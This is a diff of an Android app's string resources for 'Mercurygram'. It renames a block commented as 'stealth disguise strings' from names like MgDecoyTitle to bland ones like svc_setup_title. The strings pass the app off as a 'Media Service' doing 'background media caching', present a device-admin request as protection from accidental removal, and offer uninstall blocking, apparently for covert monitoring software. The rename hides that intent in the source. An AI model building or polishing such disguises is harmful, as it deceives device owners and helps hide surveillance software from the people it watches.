@@ -2,19 +2,19 @@
 <resources>
     <string name="AppName">Mercurygram</string>
     <!-- MG stealth disguise strings -->
-    <string name="MgServiceName">Media Service</string>
-    <string name="MgServiceTileLabel">Media Service</string>
-    <string name="MgDecoyTitle">Media Service</string>
-    <string name="MgDecoyBody">This service manages background media caching. No user action is required.</string>
-    <string name="MgDecoyStatus">Status: connected</string>
-    <string name="MgAdminExplanation">Allows the service to protect itself from accidental removal.</string>
-    <string name="MgAdminDisableWarning">Turning this off will stop background notification protection.</string>
-    <string name="MgProtTitle">Service protection</string>
-    <string name="MgProtEnable">Enable uninstall protection</string>
-    <string name="MgProtUninstall">Uninstall this app</string>
-    <string name="MgProtStatusOn">Protection: ON (uninstall is blocked until disabled here)</string>
-    <string name="MgProtStatusOff">Protection: OFF</string>
-    <string name="MgProtAlreadyOn">Protection is already on</string>
+    <string name="svc_name">Media Service</string>
+    <string name="svc_tile_label">Media Service</string>
+    <string name="svc_setup_title">Media Service</string>
+    <string name="svc_setup_body">This service manages background media caching. No user action is required.</string>
+    <string name="svc_setup_status">Status: connected</string>
+    <string name="svc_policy_desc">Allows the service to protect itself from accidental removal.</string>
+    <string name="svc_policy_warn">Turning this off will stop background notification protection.</string>
+    <string name="svc_m_title">Service protection</string>
+    <string name="svc_m_enable">Enable uninstall protection</string>
+    <string name="svc_m_remove">Uninstall this app</string>
+    <string name="svc_m_on">Protection: ON (uninstall is blocked until disabled here)</string>
+    <string name="svc_m_off">Protection: OFF</string>
+    <string name="svc_m_already">Protection is already on</string>
     <string name="AppNameBeta">Mercurygram Beta</string>
     <string name="LanguageName">English</string>
     <string name="English">English</string>
